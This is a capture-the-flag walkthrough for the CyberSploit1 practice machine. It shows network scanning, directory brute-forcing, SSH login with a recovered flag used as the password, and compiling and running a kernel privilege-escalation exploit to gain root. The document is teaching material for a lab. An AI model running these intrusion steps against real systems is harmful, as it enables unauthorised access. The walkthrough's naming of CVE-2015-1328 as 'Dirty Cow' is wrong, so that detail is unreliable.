# CyberSploit1-Walkthrough
This is a step-by-step walkthrough for the CyberSploit1 machine. It includes network discovery, service enumeration, hidden file identification, privilege escalation, and flag retrieval.

## 1. Target Discovery
**Tool Used**: `netdiscover`

```bash
netdiscover
```

**Identified IP:**
```
192.168.21.139
```
This IP belongs to the target machine (PCS Systemtechnik GmbH).

---

## 2. Service Enumeration
**Tool Used**: `nmap`

```bash
nmap -sV -sC 192.168.21.139 -Pn
```

**Open Ports:**
- 22/tcp – SSH (OpenSSH 5.9p1)
- 80/tcp – HTTP (Apache 2.2.22)

---

## 3. Web Enumeration
**Accessed** `http://192.168.21.139` in browser.
- Page showed: "Hello Pentester!"
- Source code revealed username: `itsskv`

---

## 4. Directory Bruteforce
**Tool Used**: `dirb`

Discovered: `/robots.txt`

**Contents:**
```
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
```

**Decoded via dcode.fr (Base64):**
```
Flag1: cybersploit{youtube.com/c/cybersploit}
```

---

## 5. SSH Login
```bash
ssh itsskv@192.168.21.139
# Password: cybersploit{youtube.com/c/cybersploit}
```
**Login Successful.**

---

## 6. Local Flag Access
Found file: `flag2.txt`
Used:
```bash
cat flag2.txt
```
**Binary Text:**
```
01100111 01101111 ...
```
Decoded using [cryptii.com](https://cryptii.com/) (binary to ASCII):
```
flag2: cybersploit{https:t.me/cybersploit1}
```

---

## 7. Privilege Escalation
**Checked Kernel Version:**
```bash
uname -a
```
Output:
```
3.13.0-32-generic
```

**Found Exploit:** CVE-2015-1328 (Dirty Cow vulnerability)
- Uploaded exploit to `/tmp` as `exploit.c`

**Compiled and Executed:**
```bash
gcc exploit.c -o exploit
./exploit
```
**Gained Root Shell.**

---

## 8. Final Flag
Navigated to `/root` folder:
```
flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
```

---

## Summary
- **Flag1**: `cybersploit{youtube.com/c/cybersploit}`
- **Flag2**: `cybersploit{https:t.me/cybersploit1}`
- **Flag3**: `cybersploit{Z3X21CW42C4 many many congratulations !}`

---

## User Identified
- **Username**: `itsskv`

---

## Note
This walkthrough was performed on a local network and is intended for educational purposes only. Do not attempt to access or exploit systems without explicit permission.

